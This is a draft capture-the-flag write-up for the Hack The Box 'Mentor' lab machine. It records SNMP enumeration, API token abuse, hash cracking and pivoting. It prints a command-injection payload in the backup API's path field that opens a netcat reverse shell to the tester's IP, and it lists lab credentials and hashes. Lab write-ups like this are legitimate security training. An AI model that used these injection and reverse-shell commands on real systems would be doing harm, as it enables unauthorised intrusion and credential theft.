---
title: HTB Mentor
date: 2026-03-29
author: kei5uke
draft: true
description: Writeup for HTB Mentor
tags:
  - linux
  - writeup
---

```
# Nmap 7.95 scan initiated Sun Mar 29 05:45:08 2026 as: /usr/lib/nmap/nmap -sC -sV -p- -oN nmap.tcp.txt -v 10.129.228.102    │
Nmap scan report for 10.129.228.102                                                                                          │
Host is up (0.030s latency).                                                                                                 │
Not shown: 65533 closed tcp ports (reset)                                                                                    │
PORT   STATE SERVICE VERSION                                                                                                 │
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)                                                     │
| ssh-hostkey:                                                                                                               │
|   256 c7:3b:fc:3c:f9:ce:ee:8b:48:18:d5:d1:af:8e:c2:bb (ECDSA)                                                              │
|_  256 44:40:08:4c:0e:cb:d4:f1:8e:7e:ed:a8:5c:68:a4:f7 (ED25519)                                                            │
80/tcp open  http    Apache httpd 2.4.52                                                                                     │
| http-methods:                                                                                                              │
|_  Supported Methods: GET HEAD POST OPTIONS                                                                                 │
|_http-title: Did not follow redirect to http://mentorquotes.htb/                                                            │
|_http-server-header: Apache/2.4.52 (Ubuntu)                                                                                 │
Service Info: Host: mentorquotes.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel 
```

```
nmap -sU -T4 --top-port=100 mentorquotes.htb                                                                              │
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-29 08:16 EDT                                                              │
Nmap scan report for mentorquotes.htb (10.129.228.102)                                                                       │
Host is up (0.030s latency).                                                                                                 │
Not shown: 59 open|filtered udp ports (no-response), 40 closed udp ports (port-unreach)                                      │
PORT    STATE SERVICE                                                                                                        │
161/udp open  snmp
```

# SNMP 161

- admin
- mentor
- Hit only Public
- `snmpbulkwalk -c public -v2c 10.129.228.102 .`
    
    ```jsx
    SNMPv2-MIB::sysDescr.0 = STRING: Linux mentor 5.15.0-56-generic #62-Ubuntu SMP Tue Nov 22 19:54:14 UTC 2022 x86_64                                                                                                                                         
    SNMPv2-MIB::sysObjectID.0 = OID: NET-SNMP-MIB::netSnmpAgentOIDs.10                                                                                                                                                                                         
    DISMAN-EVENT-MIB::sysUpTimeInstance = Timeticks: (977044) 2:42:50.44                                                                                                                                                                                       
    SNMPv2-MIB::sysContact.0 = STRING: Me <admin@mentorquotes.htb>                                                                                                                                                                                             
    SNMPv2-MIB::sysName.0 = STRING: mentor                                                                                                                                                                                                                     
    SNMPv2-MIB::sysLocation.0 = STRING: Sitting on the Dock of the Bay                                                                                                                                                                                         
    SNMPv2-MIB::sysServices.0 = INTEGER: 72                                                                                                                                                                                                                    
    SNMPv2-MIB::sysORLastChange.0 = Timeticks: (2) 0:00:00.02                                                                                                                                                                                                  
    SNMPv2-MIB::sysORID.1 = OID: SNMP-FRAMEWORK-MIB::snmpFrameworkMIBCompliance                                                                                                                                                                                
    SNMPv2-MIB::sysORID.2 = OID: SNMP-MPD-MIB::snmpMPDCompliance                                                                                                                                                                                               
    SNMPv2-MIB::sysORID.3 = OID: SNMP-USER-BASED-SM-MIB::usmMIBCompliance                                                                                                                                                                                      
    SNMPv2-MIB::sysORID.4 = OID: SNMPv2-MIB::snmpMIB                                                                                                                                                                                                           
    SNMPv2-MIB::sysORID.5 = OID: SNMP-VIEW-BASED-ACM-MIB::vacmBasicGroup                                                                                                                                                                                       
    SNMPv2-MIB::sysORID.6 = OID: TCP-MIB::tcpMIB                                                                                                                                                                                                               
    SNMPv2-MIB::sysORID.7 = OID: UDP-MIB::udpMIB                                                                                                                                                                                                               
    SNMPv2-MIB::sysORID.8 = OID: IP-MIB::ip                                                                                                                                                                                                                    
    SNMPv2-MIB::sysORID.9 = OID: SNMP-NOTIFICATION-MIB::snmpNotifyFullCompliance                                                                                                                                                                               
    SNMPv2-MIB::sysORID.10 = OID: NOTIFICATION-LOG-MIB::notificationLogMIB                                                                                                                                                                                     
    SNMPv2-MIB::sysORDescr.1 = STRING: The SNMP Management Architecture MIB.                                                                                                                                                                                   
    SNMPv2-MIB::sysORDescr.2 = STRING: The MIB for Message Processing and Dispatching.                                                                                                                                                                         
    SNMPv2-MIB::sysORDescr.3 = STRING: The management information definitions for the SNMP User-based Security Model.                                                                                                                                          
    SNMPv2-MIB::sysORDescr.4 = STRING: The MIB module for SNMPv2 entities                                                                                                                                                                                      
    SNMPv2-MIB::sysORDescr.5 = STRING: View-based Access Control Model for SNMP.                                                                                                                                                                               
    SNMPv2-MIB::sysORDescr.6 = STRING: The MIB module for managing TCP implementations                                                                                                                                                                         
    SNMPv2-MIB::sysORDescr.7 = STRING: The MIB module for managing UDP implementations                                                                                                                                                                         
    SNMPv2-MIB::sysORDescr.8 = STRING: The MIB module for managing IP and ICMP implementations                                                                                                                                                                 
    SNMPv2-MIB::sysORDescr.9 = STRING: The MIB modules for managing SNMP Notification, plus filtering.                                                                                                                                                         
    SNMPv2-MIB::sysORDescr.10 = STRING: The MIB module for logging SNMP Notifications.                                                                                                                                                                         
    SNMPv2-MIB::sysORUpTime.1 = Timeticks: (2) 0:00:00.02                                                                                                                                                                                                      
    SNMPv2-MIB::sysORUpTime.2 = Timeticks: (2) 0:00:00.02
    SNMPv2-MIB::sysORUpTime.3 = Timeticks: (2) 0:00:00.02
    SNMPv2-MIB::sysORUpTime.4 = Timeticks: (2) 0:00:00.02
    SNMPv2-MIB::sysORUpTime.5 = Timeticks: (2) 0:00:00.02
    SNMPv2-MIB::sysORUpTime.6 = Timeticks: (2) 0:00:00.02
    SNMPv2-MIB::sysORUpTime.7 = Timeticks: (2) 0:00:00.02
    SNMPv2-MIB::sysORUpTime.8 = Timeticks: (2) 0:00:00.02
    SNMPv2-MIB::sysORUpTime.9 = Timeticks: (2) 0:00:00.02
    SNMPv2-MIB::sysORUpTime.10 = Timeticks: (2) 0:00:00.02
    HOST-RESOURCES-MIB::hrSystemUptime.0 = Timeticks: (978065) 2:43:00.65
    HOST-RESOURCES-MIB::hrSystemDate.0 = STRING: 2026-3-29,12:26:56.0,+0:0
    HOST-RESOURCES-MIB::hrSystemInitialLoadDevice.0 = INTEGER: 393216
    HOST-RESOURCES-MIB::hrSystemInitialLoadParameters.0 = STRING: "BOOT_IMAGE=/vmlinuz-5.15.0-56-generic root=/dev/mapper/ubuntu--vg-ubuntu--lv ro net.ifnames=0 biosdevname=0
    "                                                             
    HOST-RESOURCES-MIB::hrSystemNumUsers.0 = Gauge32: 0
    HOST-RESOURCES-MIB::hrSystemProcesses.0 = Gauge32: 228
    HOST-RESOURCES-MIB::hrSystemMaxProcesses.0 = INTEGER: 0
    HOST-RESOURCES-MIB::hrSystemMaxProcesses.0 = No more variables left in this MIB View (It is past the end of the MIB tree)
    ```
    

`python3 snmpbrute.py -t mentorquotes.htb` 

![[HTB Mentor - image.png]]

`snmp-check 10.129.228.102 -v 2c -c internal`

- `/usr/bin/python3      /usr/local/bin/login.py kj23sadkj123as0-d213`

# HTTP 80

![[HTB Mentor - image 1.png]]

- Flask 2.0.3
- Python 3.6.9

```
404      GET        4l       34w      232c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET      167l      621w     5506c http://mentorquotes.htb/                                      
403      GET        9l       28w      281c http://mentorquotes.htb/server-status
```

```
405     POST        4l       23w      178c http://mentorquotes.htb/
403     POST        9l       28w      281c http://mentorquotes.htb/server-status
```

![[HTB Mentor - image 2.png]]

Found subdomain: `api.mentorquotes.htb`

![[HTB Mentor - image 3.png]]

`james`

`james@mentorquotes.htb`

`http://api.mentorquotes.htb/`

```
curl http://api.mentorquotes.htb/auth/signup  -H "Content-Type: application/json" -X POST -d '{"email":"test@test.com", "username":"test123", "password":"password123"}'                                                                              
{"id":4,"email":"test@test.com","username":"test123"}
```

```
curl http://api.mentorquotes.htb/quotes/ -H "Accept: */*" -H "Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InRlc3QxMjMiLCJlbWFpbCI6InRlc3RAdGVzdC5jb20ifQ.GQr-2RtHL4iJBe9iJpcrwQ759j0NF8mgvEzeDYgMaFo" -X GET  -v
Note: Unnecessary use of -X or --request, GET is already inferred.
* Host api.mentorquotes.htb:80 was resolved.
* IPv6: (none)
* IPv4: 10.129.228.102
*   Trying 10.129.228.102:80...
* Established connection to api.mentorquotes.htb (10.129.228.102 port 80) from 10.10.15.252 port 46466 
* using HTTP/1.x
> GET /quotes/ HTTP/1.1
> Host: api.mentorquotes.htb
> User-Agent: curl/8.17.0
> Accept: */*
> Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InRlc3QxMjMiLCJlbWFpbCI6InRlc3RAdGVzdC5jb20ifQ.GQr-2RtHL4iJBe9iJpcrwQ759j0NF8mgvEzeDYgMaFo
> 
* Request completely sent off
< HTTP/1.1 200 OK
< Date: Sun, 29 Mar 2026 14:58:29 GMT
< Server: uvicorn
< content-length: 2165
< content-type: application/json
< 
[{"title":" I believed I was good","description":"I was so bad at studies in school. Teachers used to tell me that I should follow a different passion other than typical education. Nonetheless, I got rid of the negativity in myself and others and worked as hard as I could in my finals and college education. Now I am a paid accountant for a major brand in my country.","id":1},{"title":"Find your passion before its too late","description":"When I was growing up, I did not really have much, sure I enjoyed my passion but did not take it seriously. When I worked in a gas station for 3 years at that point I made a decision to go back to education and get a masters degree. Now I am a senior content engineer for a reputed company","id":2},{"title":"Never too late","description":"I was a construction worker for almost 10 years. I had to work there because I did not have any educational background to work in the academic sector. But I realized I was not getting the best of my life. So I started investing in crypto. Learned about how investing is done professionally. Soon enough I was able to give up the construction sector and start my own business. I did all this in my 60s","id":3},{"title":"Age is just a number","description":"When I was was kid, I used to create very simple video games as a hobby. Because I loved it so much, I thought to myself that I am going to be a game developer someday. With self-motivation, I applied for a job as a game designer when I just finished school. Now I work there as a permanent video game developer. And I am really proud to be the youngest employee there.","id":4},{"title":"Its all worth it in the end","description":"Working as a school teacher, I had a lot of responsibilities to fulfill. Even though I really loved teaching kids, the pressure was unbearable. I had 10-hour shifts at school including all the extra classes. But I did all of them to support the kids who needed my help. Now I am retired and I can not think of anything else that I would have done except this. When I see the k* Connection #0 to host api.mentorquotes.htb:80 left intact
ids I teach come and visit me telling how they enjoyed my teaching, all the hard work I put in is worth it.","id":5}]
```

# Using James Credential

`james:kj23sadkj123as0-d213`

[{"id":1,"email":"james@mentorquotes.htb","username":"james"},{"id":2,"email":"svc@mentorquotes.htb","username":"service_acc"},{"id":4,"email":"user@example.com","username":"keisuke"}]

```
curl http://api.mentorquotes.htb/admin/ -H "Accept: */*" -H "Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImphbWVzIiwiZW1haWwiOiJqYW1lc0BtZW50b3JxdW90ZXMuaHRiIn0.peGpmshcF666bimHkYIBKQN7hj5m785uKcjwbD--Na0" -X GET            
{"admin_funcs":{"check db connection":"/check","backup the application":"/backup"}}
```

# Shell in Docker container

1. Login in as james and use the token
2. This gives you a shell

`curl http://api.mentorquotes.htb/admin/backup -H "Content-Type: application/json" -H "Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImphbWVzIiwiZW1haWwiOiJqYW1lc0BtZW50b3JxdW90ZXMuaHRiIn0.peGpmshcF666bimHkYIBKQN7hj5m785uKcjwbD--Na0" -X POST -d '{"path":"/; nc 10.10.15.252 4444 -e sh; "}'`

![[HTB Mentor - image 4.png]]

- `postgresql://postgres:postgres@172.22.0.1/mentorquotes_db`

Connect to the DB with Ligolo pivoting

![[HTB Mentor - image 5.png]]

`james:7ccdcd8c05b59add9c198d492b36a503`

`svc:53f22d0dfa10dce7e29cd31f4f953fd8`

`hashcat ./svc-hash /usr/share/wordlists/rockyou.txt -m 0`

`123meunomeeivani`

Port: 46149, 53

```
ctr was found in /usr/bin/ctr, you may be able to escalate privileges with it

#)You_can_write_even_more_files_inside_last_directory                                                                        │host:46149/render/https:/render/https:/www.google.com
                                                                                                                             │301      GET        2l        3w       57c http://localhost:46149/render/https://render/ => http://localhost:46149/render/htt
/usr/local/bin/login.py                                                                                                      │ps:/render/
/usr/local/bin/login.sh
```

Found james password in `/etc/snmp/snmpd.conf`

`SuperSecurePassword123__`
